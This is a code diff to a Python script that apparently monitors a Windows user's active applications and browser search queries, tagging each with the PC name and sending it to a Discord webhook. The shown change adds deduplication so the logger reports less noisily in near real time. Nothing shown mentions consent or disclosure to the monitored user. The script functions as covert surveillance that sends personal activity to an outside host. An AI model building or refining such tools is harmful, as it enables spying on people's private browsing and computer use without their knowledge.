@@ -13,6 +13,9 @@ WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
 # Get PC name
 PC_NAME = socket.gethostname()
 
+# Store last logged application to reduce spam
+last_logged = None
+
 # Function to get active window title
 def get_active_window_title():
     hwnd = win32gui.GetForegroundWindow()
@@ -44,11 +47,12 @@ def send_to_discord(message):
 
 # Monitoring loop
 def monitor():
+    global last_logged
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         app_name, window_title = get_active_window_title()
         
-        if app_name:
+        if app_name and (app_name, window_title) != last_logged:
             log_message = f"[{timestamp}] {PC_NAME} - User opened {app_name}: {window_title}"
             
             if app_name in ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]:
@@ -57,6 +61,7 @@ def monitor():
                     log_message = f"[{timestamp}] {PC_NAME} - User searched: {search_query}"
             
             send_to_discord(log_message)
+            last_logged = (app_name, window_title)
         
         time.sleep(2)  # Reduced sleep for near real-time logging
 
